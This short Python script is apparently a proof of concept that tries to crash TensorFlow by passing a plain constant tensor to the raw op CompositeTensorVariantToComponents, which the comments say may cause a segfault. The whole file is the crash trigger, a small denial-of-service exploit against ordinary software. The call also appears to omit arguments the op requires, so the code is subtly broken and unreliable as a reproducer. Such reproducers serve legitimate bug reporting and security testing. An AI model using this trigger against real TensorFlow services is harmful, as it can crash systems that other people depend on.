import tensorflow as tf

# This function demonstrates the vulnerability by directly calling the raw op
def trigger_vulnerability(encoded):
    # If 'encoded' is not a valid CompositeTensorVariant, this may cause a segfault
    return tf.raw_ops.CompositeTensorVariantToComponents(encoded)

# Example usage with an invalid input
# Here, we intentionally pass an invalid tensor type
invalid_encoded = tf.constant([1, 2, 3])  # Not a CompositeTensorVariant
components = trigger_vulnerability(invalid_encoded)  # This could trigger a segfault